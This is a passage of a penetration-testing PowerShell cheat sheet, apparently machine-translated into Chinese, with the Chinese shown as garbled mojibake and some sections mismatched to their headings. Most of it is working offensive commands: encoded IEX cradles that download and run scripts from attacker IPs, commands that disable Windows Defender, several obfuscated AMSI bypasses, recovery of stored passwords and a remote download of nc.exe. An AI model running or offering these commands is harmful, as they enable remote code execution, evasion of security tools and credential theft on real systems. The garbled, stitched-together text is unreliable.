åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ `Start-BitsTransfer` å‘½ä»¤ä» `http://example.com/largefile.zip` ä¸‹è½½å¤§æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¿å­˜åˆ°æœ¬åœ°çš„ `C:\path\to\save\largefile.zip` è·¯å¾„ä¸‹ã€‚é€šè¿‡è®¾ç½® `-TransferType` å‚æ•°ä¸º `Recover`ï¼Œæˆ‘ä»¬å¯ç”¨äº†æ–­ç‚¹ç»­ä¼ åŠŸèƒ½ã€‚

#### é™åˆ¶å¸¦å®½

å¦‚æœä½ æƒ³é™åˆ¶ä¸‹è½½è¿‡ç¨‹ä¸­çš„å¸¦å®½ä½¿ç”¨ï¼Œå¯ä»¥ä½¿ç”¨ `-Priority` å‚æ•°æ¥è®¾ç½®ä¸‹è½½ä»»åŠ¡çš„ä¼˜å…ˆçº§ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¯ç”¨çš„ä¼˜å…ˆçº§é€‰é¡¹ï¼š

- `Foreground`ï¼šå‰å°ä¼˜å…ˆçº§ï¼Œä½¿ç”¨æœ€é«˜å¸¦å®½ã€‚
- `High`ï¼šé«˜ä¼˜å…ˆçº§ï¼Œä½¿ç”¨è¾ƒé«˜å¸¦å®½ã€‚
- `Normal`ï¼šæ­£å¸¸ä¼˜å…ˆçº§ï¼Œä½¿ç”¨é»˜è®¤å¸¦å®½ã€‚
- `Low`ï¼šä½ä¼˜å…ˆçº§ï¼Œä½¿ç”¨è¾ƒä½å¸¦å®½ã€‚
- `Background`ï¼šåå°ä¼˜å…ˆçº§ï¼Œä½¿ç”¨æœ€ä½å¸¦å®½ã€‚

ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼š

```powershell
Start-BitsTransfer -Source http://example.com/file.txt -Destination C:\path\to\save\file.txt -Priority Low
```

åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ `Start-BitsTransfer` å‘½ä»¤ä» `http://example.com/file.txt` ä¸‹è½½æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¿å­˜åˆ°æœ¬åœ°çš„ `C:\path\to\save\file.txt` è·¯å¾„ä¸‹ã€‚é€šè¿‡è®¾ç½® `-Priority` å‚æ•°ä¸º `Low`ï¼Œæˆ‘ä»¬é™åˆ¶äº†ä¸‹è½½ä»»åŠ¡çš„å¸¦å®½ä½¿ç”¨ã€‚

#### æ€»ç»“

BitsTransfer æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œå¯ä»¥åœ¨æ¸—é€æµ‹è¯•ä¸­å¸®åŠ©ä½ ä¸‹è½½ç›®æ ‡ç³»ç»Ÿä¸Šçš„æ–‡ä»¶ã€‚å®ƒæ”¯æŒæ–­ç‚¹ç»­ä¼ åŠŸèƒ½å’Œå¸¦å®½é™åˆ¶ï¼Œä½¿å¾—æ–‡ä»¶ä¼ è¾“æ›´åŠ çµæ´»å’Œå¯æ§ã€‚
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
# OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
## Base64 Kali & EncodedCommand

### Base64 Kali

åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤ã€‚ä¸ºäº†é¿å…åœ¨ç½‘ç»œä¸Šä¼ è¾“æ˜æ–‡å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Base64ç¼–ç æ¥å¯¹å‘½ä»¤è¿›è¡Œç¼–ç ã€‚åœ¨Kali Linuxä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨`base64`å‘½ä»¤æ¥è¿›è¡Œç¼–ç å’Œè§£ç ã€‚

è¦å¯¹å‘½ä»¤è¿›è¡Œç¼–ç ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```bash
echo -n 'command' | base64
```

è¦å¯¹ç¼–ç åçš„å‘½ä»¤è¿›è¡Œè§£ç ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```bash
echo -n 'encoded_command' | base64 -d
```

### EncodedCommand

åœ¨ä½¿ç”¨PowerShellè¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨`EncodedCommand`å‚æ•°æ¥æ‰§è¡ŒBase64ç¼–ç çš„å‘½ä»¤ã€‚è¿™å¯ä»¥å¸®åŠ©æˆ‘ä»¬ç»•è¿‡ä¸€äº›å®‰å…¨é™åˆ¶ï¼Œå¦‚å‘½ä»¤è¡Œé•¿åº¦é™åˆ¶ã€‚

è¦æ‰§è¡ŒBase64ç¼–ç çš„å‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
powershell.exe -EncodedCommand 'base64_encoded_command'
```

è¯·æ³¨æ„ï¼Œ`base64_encoded_command`æ˜¯ç»è¿‡Base64ç¼–ç çš„å‘½ä»¤å­—ç¬¦ä¸²ã€‚

ä½¿ç”¨`EncodedCommand`å‚æ•°æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ç¡®ä¿å‘½ä»¤æ²¡æœ‰æ¢è¡Œç¬¦ï¼Œå¦åˆ™å°†æ— æ³•æ­£ç¡®æ‰§è¡Œã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥åˆ é™¤æ¢è¡Œç¬¦ï¼š

```bash
echo -n 'command' | base64 | tr -d '\n'
```

è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨Base64ç¼–ç å’Œ`EncodedCommand`å‚æ•°æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä»¥ä¾¿åœ¨æ¸—é€æµ‹è¯•ä¸­ç»•è¿‡ä¸€äº›é™åˆ¶ã€‚
```powershell
kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
PS> powershell -EncodedCommand <Base64>
```
## [æ‰§è¡Œç­–ç•¥](../authentication-credentials-uac-and-efs.md#ps-execution-policy)

## [å—é™è¯­è¨€](broken-reference/)

## [AppLockerç­–ç•¥](broken-reference/)

## å¯ç”¨WinRMï¼ˆè¿œç¨‹PSï¼‰
```powershell
enable-psremoting -force #This enables winrm

# Change NetWorkConnection Category to Private
#Requires -RunasAdministrator

Get-NetConnectionProfile |
Where{ $_.NetWorkCategory -ne 'Private'} |
ForEach {
$_
$_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
}
```
## ç¦ç”¨Defender

{% code overflow="wrap" %}
```powershell
# Check status
Get-MpComputerStatus
Get-MpPreference | select Exclusion* | fl #Check exclusions
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
#To completely disable Windows Defender on a computer, use the command:
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# Set exclusion path
Set-MpPreference -ExclusionPath (pwd) -disablerealtimemonitoring
Add-MpPreference -ExclusionPath (pwd)

# Check exclusions configured via GPO
Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
```
{% endcode %}

### AMSIç»•è¿‡

**`amsi.dll`**è¢«**åŠ è½½**åˆ°æ‚¨çš„è¿›ç¨‹ä¸­ï¼Œå¹¶å…·æœ‰ä»»ä½•åº”ç”¨ç¨‹åºä¸ä¹‹äº¤äº’æ‰€éœ€çš„**å¯¼å‡ºå‡½æ•°**ã€‚ç”±äºå®ƒè¢«åŠ è½½åˆ°æ‚¨æ§åˆ¶çš„è¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡**è¦†ç›–å†…å­˜ä¸­çš„æŒ‡ä»¤**æ¥æ”¹å˜å…¶è¡Œä¸ºï¼Œä½¿å…¶æ— æ³•æ£€æµ‹åˆ°ä»»ä½•å†…å®¹ã€‚

å› æ­¤ï¼Œæ‚¨çš„ç›®æ ‡æ˜¯é€šè¿‡åœ¨å†…å­˜ä¸­**è¦†ç›–è¯¥DLLçš„æŒ‡ä»¤**ï¼Œä½¿æ£€æµ‹å˜å¾—æ— æ•ˆã€‚

**AMSIç»•è¿‡ç”Ÿæˆå™¨**ç½‘é¡µï¼š[**https://amsi.fail/**](https://amsi.fail/)
```powershell
# A Method
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)

# Another: from https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_09.ps1
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'NonPublic,Static').
SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
&( $SHELLid[1]+$SHELlId[13]+'X') (NeW-OBJEct sYStEm.iO.coMPrESSIOn.defLAtEstReam( [iO.meMorYStReAm] [cOnvErt]::froMBaSE64StRINg( 'rVHRasJAEHzvdwhGkBAhLUXwYU7i2aKFq4mQBh8Sc6bBM5HkYmq/vruQfkF7L3s7s8vM3CXv+nRw0bb6kpm7K7UN71ftjJwk1F/WDapjnZdVcZjPo6qku+aRnW0Ic5JlXd10Y4lcNfVFpK1+8gduHPXiEestcggD6WFTiDfIAFkhPiGP+FDCQkbce1j6UErMsFbIesYD3rtCPhOPDgHtKfENecZe0TzVDNRjsRhP6LCpValN/g/GYzZGxlMlXiF9rh6CGISToZ6Nn3+Fp3+XCwtxY5kIlF++cC6S2WIDEfJ7xEPeuMeQdaftPjUdfVLVGTMd2abTk4cf'), [sysTEm.iO.cOmpResSioN.COMprEssiOnMOde]::decOMPRESs ) | foreAch{NeW-OBJEct iO.STREaMREadER( $_ , [teXt.ENCoDiNg]::aScii )}).REadtoenD( )

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
${2}=[Ref].Assembly.GetType('Sy'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQAuAE0A')))+'an'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'m'+'en'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAAuAEEAdQA=')))+'t'+'om'+'at'+'io'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgAuAEEA')))+'ms'+'i'+'U'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAGwA')))+'s')
${1}=${2}.GetField('am'+'s'+'iI'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBpAHQA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAA=')))+'ed','No'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBQAHUA')))+'bl'+'i'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAsAFMA')))+'ta'+'ti'+'c')
${1}.SetValue($null,$true)

# Another Method
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)

# AMSI Bypass in python
https://fluidattacks.com/blog/amsi-bypass-python/

# Testing for Amsi Bypass:
https://github.com/rasta-mouse/AmsiScanBufferBypass

# Amsi-Bypass-Powershell
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

https://blog.f-secure.com/hunting-for-amsi-bypasses/
https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
https://slaeryan.github.io/posts/falcon-zero-alpha.html
```
### AMSIç»•è¿‡2-æ‰˜ç®¡APIè°ƒç”¨æŒ‚é’©

æŸ¥çœ‹[**æ­¤å¸–å­ä»¥è·å–è¯¦ç»†ä¿¡æ¯**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)å’Œ[**ä»£ç **](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)ã€‚

è¿™ç§æ–°æŠ€æœ¯ä¾èµ–äºå¯¹.NETæ–¹æ³•çš„APIè°ƒç”¨æŒ‚é’©ã€‚äº‹å®è¯æ˜ï¼Œ.NETæ–¹æ³•éœ€è¦åœ¨å†…å­˜ä¸­ç¼–è¯‘ä¸ºæœ¬æœºæœºå™¨æŒ‡ä»¤ï¼Œè¿™äº›æŒ‡ä»¤çœ‹èµ·æ¥éå¸¸ç±»ä¼¼äºæœ¬æœºæ–¹æ³•ã€‚è¿™äº›ç¼–è¯‘åçš„æ–¹æ³•å¯ä»¥è¢«æŒ‚é’©ä»¥æ”¹å˜ç¨‹åºçš„æ§åˆ¶æµã€‚

æ‰§è¡Œ.NETæ–¹æ³•çš„APIè°ƒç”¨æŒ‚é’©çš„æ­¥éª¤å¦‚ä¸‹ï¼š

1. ç¡®å®šè¦æŒ‚é’©çš„ç›®æ ‡æ–¹æ³•
2. å®šä¹‰ä¸€ä¸ªä¸ç›®æ ‡æ–¹æ³•å…·æœ‰ç›¸åŒå‡½æ•°åŸå‹çš„æ–¹æ³•
3. ä½¿ç”¨åå°„æ‰¾åˆ°è¿™äº›æ–¹æ³•
4. ç¡®ä¿æ¯ä¸ªæ–¹æ³•å·²ç»è¢«ç¼–è¯‘
5. æ‰¾åˆ°æ¯ä¸ªæ–¹æ³•åœ¨å†…å­˜ä¸­çš„ä½ç½®
6. ç”¨æŒ‡å‘æˆ‘ä»¬æ¶æ„æ–¹æ³•çš„æŒ‡ä»¤è¦†ç›–ç›®æ ‡æ–¹æ³•

## PS-History
```powershell
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
## è·å–æƒé™

To determine the permissions of a file or directory in PowerShell, you can use the `Get-Acl` cmdlet. This cmdlet retrieves the access control list (ACL) for the specified object.

```powershell
Get-Acl -Path C:\path\to\file.txt
```

This command will display the permissions associated with the file.txt file, including the owner, group, and individual user permissions.

To retrieve the permissions for a directory and all its contents, you can use the `-Recurse` parameter:

```powershell
Get-Acl -Path C:\path\to\directory -Recurse
```

This command will display the permissions for the specified directory and all its subdirectories and files.

You can also filter the output to display only specific properties of the ACL, such as the owner or the access rules. For example, to display only the access rules for a file, you can use the `Access` property:

```powershell
(Get-Acl -Path C:\path\to\file.txt).Access
```

This command will display only the access rules for the file.txt file.

By using the `Get-Acl` cmdlet, you can easily retrieve and analyze the permissions of files and directories in PowerShell.
```powershell
Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```
## æ“ä½œç³»ç»Ÿç‰ˆæœ¬å’Œçƒ­è¡¥ä¸

To obtain information about the operating system version and installed hotfixes, you can use the following PowerShell commands:

```powershell
# è·å–æ“ä½œç³»ç»Ÿç‰ˆæœ¬
(Get-WmiObject -Class Win32_OperatingSystem).Caption

# è·å–å·²å®‰è£…çš„çƒ­è¡¥ä¸
Get-HotFix
```

The first command retrieves the operating system version using the `Win32_OperatingSystem` class. The `Caption` property contains the name of the operating system.

The second command retrieves a list of installed hotfixes using the `Get-HotFix` cmdlet. This will provide information such as the hotfix ID, description, and installation date.

By running these commands, you can gather important information about the target system's operating system version and applied hotfixes. This information can be useful for identifying vulnerabilities and determining the level of patching on the system.
```powershell
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
## ç¯å¢ƒ

The following tools and technologies are required to follow the examples in this guide:

- Windows operating system (Windows 7 or higher)
- PowerShell (version 2.0 or higher)

## å¿…è¦ç¯å¢ƒ

ä¸ºäº†è·Ÿéšæœ¬æŒ‡å—ä¸­çš„ç¤ºä¾‹ï¼Œéœ€è¦ä»¥ä¸‹å·¥å…·å’ŒæŠ€æœ¯ï¼š

- Windowsæ“ä½œç³»ç»Ÿï¼ˆWindows 7æˆ–æ›´é«˜ç‰ˆæœ¬ï¼‰
- PowerShellï¼ˆ2.0ç‰ˆæœ¬æˆ–æ›´é«˜ç‰ˆæœ¬ï¼‰

## Introduction

PowerShell is a powerful scripting language and automation framework that is built on top of the .NET framework. It provides a command-line shell and a scripting language that can be used to automate administrative tasks and perform system management tasks.

In the context of penetration testing, PowerShell can be a valuable tool for attackers as it provides a way to execute commands and scripts on a target system. It can be used to gather information about the target, exploit vulnerabilities, and maintain persistence on compromised systems.

This guide will cover some basic PowerShell techniques that can be useful for penetration testers. It will provide an overview of PowerShell syntax, common cmdlets, and techniques for executing commands and scripts.

## ç®€ä»‹

PowerShellæ˜¯ä¸€ç§å¼ºå¤§çš„è„šæœ¬è¯­è¨€å’Œè‡ªåŠ¨åŒ–æ¡†æ¶ï¼Œæ„å»ºåœ¨.NETæ¡†æ¶ä¹‹ä¸Šã€‚å®ƒæä¾›äº†ä¸€ä¸ªå‘½ä»¤è¡Œshellå’Œä¸€ä¸ªè„šæœ¬è¯­è¨€ï¼Œå¯ç”¨äºè‡ªåŠ¨åŒ–ç®¡ç†ä»»åŠ¡å’Œæ‰§è¡Œç³»ç»Ÿç®¡ç†ä»»åŠ¡ã€‚

åœ¨æ¸—é€æµ‹è¯•çš„èƒŒæ™¯ä¸‹ï¼ŒPowerShellå¯ä»¥æˆä¸ºæ”»å‡»è€…çš„æœ‰åŠ›å·¥å…·ï¼Œå› ä¸ºå®ƒæä¾›äº†ä¸€ç§åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤å’Œè„šæœ¬çš„æ–¹å¼ã€‚å®ƒå¯ä»¥ç”¨äºæ”¶é›†æœ‰å…³ç›®æ ‡çš„ä¿¡æ¯ï¼Œåˆ©ç”¨æ¼æ´ï¼Œå¹¶åœ¨å—æŸç³»ç»Ÿä¸Šä¿æŒæŒä¹…æ€§ã€‚

æœ¬æŒ‡å—å°†ä»‹ç»ä¸€äº›å¯¹æ¸—é€æµ‹è¯•äººå‘˜æœ‰ç”¨çš„åŸºæœ¬PowerShellæŠ€æœ¯ã€‚å®ƒå°†æ¦‚è¿°PowerShellè¯­æ³•ã€å¸¸è§çš„cmdletå’Œæ‰§è¡Œå‘½ä»¤å’Œè„šæœ¬çš„æŠ€æœ¯ã€‚
```powershell
Get-ChildItem Env: | ft Key,Value #get all values
$env:UserName @Get UserName value
```
## å…¶ä»–è¿æ¥çš„é©±åŠ¨å™¨

In some cases, you may need to access or gather information from other connected drives on a Windows system. This can be useful for lateral movement or data exfiltration during a penetration test. Here are some PowerShell commands that can help you achieve this:

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ‚¨å¯èƒ½éœ€è¦è®¿é—®æˆ–æ”¶é›†Windowsç³»ç»Ÿä¸Šå…¶ä»–è¿æ¥çš„é©±åŠ¨å™¨çš„ä¿¡æ¯ã€‚è¿™å¯¹äºæ¸—é€æµ‹è¯•æœŸé—´çš„æ¨ªå‘ç§»åŠ¨æˆ–æ•°æ®æ³„éœ²éå¸¸æœ‰ç”¨ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¯ä»¥å¸®åŠ©æ‚¨å®ç°æ­¤ç›®çš„çš„PowerShellå‘½ä»¤ï¼š

### Get-PSDrive

The `Get-PSDrive` command allows you to retrieve information about all the drives available on the system, including local drives, network drives, and mapped drives.

`Get-PSDrive`å‘½ä»¤å…è®¸æ‚¨æ£€ç´¢æœ‰å…³ç³»ç»Ÿä¸Šæ‰€æœ‰å¯ç”¨é©±åŠ¨å™¨çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬æœ¬åœ°é©±åŠ¨å™¨ã€ç½‘ç»œé©±åŠ¨å™¨å’Œæ˜ å°„é©±åŠ¨å™¨ã€‚

```powershell
Get-PSDrive
```

### Get-Volume

The `Get-Volume` command provides information about the volumes on the system, including drive letters, file system types, and sizes.

`Get-Volume`å‘½ä»¤æä¾›æœ‰å…³ç³»ç»Ÿä¸Šå·çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬é©±åŠ¨å™¨å­—æ¯ã€æ–‡ä»¶ç³»ç»Ÿç±»å‹å’Œå¤§å°ã€‚

```powershell
Get-Volume
```

### Get-WmiObject

The `Get-WmiObject` command allows you to query the WMI (Windows Management Instrumentation) database to retrieve information about the connected drives.

`Get-WmiObject`å‘½ä»¤å…è®¸æ‚¨æŸ¥è¯¢WMIï¼ˆWindowsç®¡ç†è§„èŒƒï¼‰æ•°æ®åº“ï¼Œä»¥æ£€ç´¢æœ‰å…³è¿æ¥çš„é©±åŠ¨å™¨çš„ä¿¡æ¯ã€‚

```powershell
Get-WmiObject -Class Win32_LogicalDisk
```

These commands can help you identify and access other connected drives on a Windows system, providing you with additional opportunities for exploration and exploitation.
```powershell
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
### å›æ”¶ç«™

The Recycle Bin is a feature in Windows that allows users to temporarily store deleted files and folders. When a file or folder is deleted, it is moved to the Recycle Bin instead of being permanently deleted from the system. This provides a safety net for users in case they accidentally delete something and need to restore it.

The Recycle Bin can be accessed by double-clicking on its icon on the desktop or by opening the File Explorer and navigating to the Recycle Bin folder. Once inside the Recycle Bin, users can browse through the deleted files and folders and choose to restore them to their original location or permanently delete them.

It is important to note that the Recycle Bin has a storage limit, and once it reaches its maximum capacity, older files will be automatically deleted to make room for new ones. Therefore, it is recommended to regularly empty the Recycle Bin to free up disk space.

In a pentesting scenario, the Recycle Bin can be a valuable source of information. Deleted files may still contain sensitive data that can be recovered and used for further exploitation. Tools like `Recuva` can be used to recover deleted files from the Recycle Bin or even from a formatted disk.
```powershell
$shell = New-Object -com shell.application
$rb = $shell.Namespace(10)
$rb.Items()
```
[https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/](https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/)

## åŸŸåä¾¦å¯Ÿ

{% content-ref url="powerview.md" %}
[powerview.md](powerview.md)
{% endcontent-ref %}

## ç”¨æˆ·
```powershell
Get-LocalUser | ft Name,Enabled,Description,LastLogon
Get-ChildItem C:\Users -Force | select Name
```
## å°†å®‰å…¨å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ˜æ–‡

In some cases, you may come across a secure string in PowerShell that you need to convert to plaintext. This can be useful when you need to retrieve a password or other sensitive information stored as a secure string. Here's how you can do it:

```powershell
$secureString = ConvertTo-SecureString -String "MySecurePassword" -AsPlainText -Force
$plaintext = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
```

The above code snippet demonstrates how to convert a secure string to plaintext. First, we create a secure string using the `ConvertTo-SecureString` cmdlet, specifying the desired plaintext value. Then, we use the `[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR` method to convert the secure string to a BSTR (Basic String) representation. Finally, we use the `[System.Runtime.InteropServices.Marshal]::PtrToStringAuto` method to convert the BSTR to plaintext.

Keep in mind that converting a secure string to plaintext should be done with caution, as it can expose sensitive information. Make sure to handle the plaintext data securely and avoid storing it in plain text for an extended period of time.
```powershell
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring
$user = "HTB\Tom"
$cred = New-Object System.management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
æˆ–è€…ç›´æ¥ä»XMLè§£æï¼š
```powershell
$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
## SUDO

SUDO æ˜¯ä¸€ç§åœ¨ Linux å’Œ Unix ç³»ç»Ÿä¸Šä½¿ç”¨çš„å‘½ä»¤ï¼Œå…è®¸æ™®é€šç”¨æˆ·ä»¥è¶…çº§ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œç‰¹æƒå‘½ä»¤ã€‚è¿™å¯¹äºç³»ç»Ÿç®¡ç†å‘˜æ¥è¯´éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒå…è®¸ä»–ä»¬åœ¨ä¸å®Œå…¨åˆ‡æ¢åˆ° root ç”¨æˆ·çš„æƒ…å†µä¸‹æ‰§è¡Œç‰¹æƒæ“ä½œã€‚

åœ¨ä½¿ç”¨ SUDO æ—¶ï¼Œç”¨æˆ·éœ€è¦è¾“å…¥è‡ªå·±çš„å¯†ç æ¥éªŒè¯èº«ä»½ã€‚ä¸€æ—¦éªŒè¯æˆåŠŸï¼Œç”¨æˆ·å°±å¯ä»¥æ‰§è¡Œè¢«æˆæƒçš„å‘½ä»¤ã€‚SUDO è¿˜å¯ä»¥é…ç½®ä¸ºä»…å…è®¸ç‰¹å®šç”¨æˆ·æˆ–ç”¨æˆ·ç»„æ‰§è¡Œç‰¹æƒå‘½ä»¤ã€‚

ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ SUDO å‘½ä»¤ï¼š

- `sudo -l`ï¼šåˆ—å‡ºå½“å‰ç”¨æˆ·å¯ä»¥æ‰§è¡Œçš„ç‰¹æƒå‘½ä»¤ã€‚
- `sudo -u <username> <command>`ï¼šä»¥æŒ‡å®šç”¨æˆ·çš„èº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚
- `sudo su`ï¼šåˆ‡æ¢åˆ°è¶…çº§ç”¨æˆ·ï¼ˆrootï¼‰ã€‚
- `sudo visudo`ï¼šç¼–è¾‘ SUDO é…ç½®æ–‡ä»¶ã€‚

åœ¨è¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ï¼ŒSUDO å¯èƒ½æ˜¯ä¸€ä¸ªæœ‰ç”¨çš„ç›®æ ‡ï¼Œå› ä¸ºå®ƒå¯èƒ½ä¼šå¯¼è‡´ç‰¹æƒå‡çº§ã€‚é€šè¿‡æŸ¥æ‰¾ SUDO é…ç½®æ–‡ä»¶ä¸­çš„é”™è¯¯é…ç½®æˆ–è€…åˆ©ç”¨å·²çŸ¥çš„æ¼æ´ï¼Œæ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿä»¥ root ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œå‘½ä»¤ï¼Œä»è€Œå®Œå…¨æ§åˆ¶ç›®æ ‡ç³»ç»Ÿã€‚

è¦äº†è§£æ›´å¤šå…³äº SUDO çš„ä¿¡æ¯ï¼Œå¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£æˆ–è€…å…¶ä»–ç›¸å…³èµ„æºã€‚
```powershell
#CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)

#For local:
Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"

#For WINRM
#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
#DOWNLOAD nc.exe
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri 10.10.14.17/nc.exe -outfile nc.exe } -credential $cred

Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process C:\xyz\nc.bat -verb Runas}'

#Another method
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
```
## ç”¨æˆ·ç»„

